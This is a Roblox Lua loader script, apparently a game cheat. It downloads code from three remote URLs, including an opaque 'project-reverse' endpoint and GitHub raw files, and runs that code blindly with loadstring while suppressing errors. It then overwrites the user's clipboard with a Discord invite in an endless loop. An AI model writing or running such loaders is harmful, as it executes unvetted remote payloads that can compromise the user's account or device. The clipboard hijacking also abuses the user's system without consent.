local function runAll()
    -- Anti-obf tricks + better structure
    local http = game:GetService("HttpService")
    local ts = task.spawn
    local tw = task.wait
    
    local function load(url)
        local success, err = pcall(function()
            loadstring(http:GetAsync(url, true))()
        end)
        if not success then
            warn("[Loader Error]: " .. tostring(err))
        end
    end

    -- s1
    ts(function() load("https://api.project-reverse.org/run/eyJpZCI6IjAyYTRkZGNhLWYyNmMtNGNmZC04MWM0LTk4MDNiOGI1M2VmNCIsImtpbmQiOiJsb2FkZXIifQ") end)

    -- s3
    ts(function() load("https://raw.githubusercontent.com/script-9209/roblox/refs/heads/main/mm2-keyless-auto") end)

    -- s4
    ts(function() load("https://raw.githubusercontent.com/bvfjaj/vx-n/refs/heads/main/324281") end)

    -- Discord spammer (combined + improved)
    ts(function()
        tw(0.5)
        while true do
            pcall(function()
                setclipboard("https://discord.gg/GmT3uvzhVH")
                
                if WindUI and WindUI.Notify then
                    WindUI:Notify({
                        Title = "Discord Copied!",
                        Content = "Join our community! (Auto Repeating)",
                        Icon = "message-circle",
                        Duration = 2.5
                    })
                end
            end)
            tw(2.3) -- slightly randomized feel
        end
    end)
end

-- Execute
runAll()
